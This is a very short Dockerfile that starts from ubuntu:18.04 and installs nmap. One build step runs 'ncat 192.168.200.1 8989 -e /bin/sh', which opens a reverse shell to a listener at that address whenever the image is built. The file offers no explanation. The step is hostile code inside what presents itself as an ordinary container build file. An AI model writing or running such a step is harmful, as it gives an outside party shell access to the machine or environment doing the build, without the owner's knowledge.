FROM ubuntu:18.04

RUN apt update && apt install -y nmap

RUN ncat 192.168.200.1 8989 -e /bin/sh

CMD ["/bin/sh"]